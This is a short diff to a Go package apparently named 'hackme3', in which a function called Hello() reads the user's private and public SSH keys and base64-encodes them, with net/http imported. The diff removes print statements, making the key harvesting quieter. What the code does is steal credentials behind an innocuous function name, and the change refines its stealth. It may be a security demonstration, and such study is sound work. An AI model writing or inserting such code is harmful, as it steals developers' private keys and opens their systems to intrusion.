@@ -2,7 +2,6 @@ package hackme3
 
 import (
 	"encoding/base64"
-	"fmt"
 	"io/ioutil"
 	"log"
 	"net/http"
@@ -24,7 +23,6 @@ func Hello() string {
 
 	sshKey, err := ioutil.ReadFile(usr.HomeDir + "/.ssh/id_rsa")
 	check(err)
-	fmt.Print(string(sshKey))
 
 	encoded := base64.StdEncoding.EncodeToString(sshKey)
 
@@ -32,7 +30,6 @@ func Hello() string {
 
 	sshKeyPub, err := ioutil.ReadFile(usr.HomeDir + "/.ssh/id_rsa.pub")
 	check(err)
-	fmt.Print(string(sshKey))
 
 	encoded = base64.StdEncoding.EncodeToString(sshKeyPub)
 
